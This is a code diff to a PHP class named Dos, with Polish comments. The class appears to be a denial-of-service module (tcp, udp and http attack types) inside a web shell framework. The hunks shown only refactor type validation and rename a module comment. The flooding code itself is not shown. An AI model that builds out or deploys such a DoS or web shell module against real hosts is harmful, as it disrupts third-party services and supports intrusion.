@@ -13,11 +13,6 @@ class DosException extends Exception {}
 class Dos
 {
 	/**
-	 * Wersja
-	 */
-	const VERSION = '1.0';
-
-	/**
 	 * Adres hosta
 	 *
 	 * @access protected
@@ -137,9 +132,15 @@ class Dos
 	 */
 	public function setType( $sValue )
 	{
+		static $aTypes = array(
+			'tcp',
+			'udp',
+			'http'
+		);
+
 		$sValue = strtolower( $sValue );
 
-		if( ! in_array( $sValue, array( 'tcp', 'udp', 'http' ) ) )
+		if( ! in_array( $sValue, $aTypes ) )
 		{
 			throw new DosException( 'Błędny typ ataku' );
 		}
@@ -151,7 +152,8 @@ class Dos
 		{
 			throw new DosException( 'Funkcja fsockopen i pfsockopen nie jest dostępna' );
 		}
-		else if( ( $sValue === 'http' ) && ! $this -> bCurl && ! $this -> bFsockopen && ! $this -> bPfsockopen )
+
+		if( ( $sValue === 'http' ) && ! $this -> bCurl && ! $this -> bFsockopen && ! $this -> bPfsockopen )
 		{
 			throw new DosException( 'Rozszerzenie CURL i funkcje fsockopen i pfsockopen nie są dostępne' );
 		}
@@ -480,7 +482,7 @@ class Dos
  */
 
 /**
- * ModuleDummy - Szkielet modulu
+ * ModuleDos - Denial of Service
  */
 class ModuleDos implements ShellInterface
 {
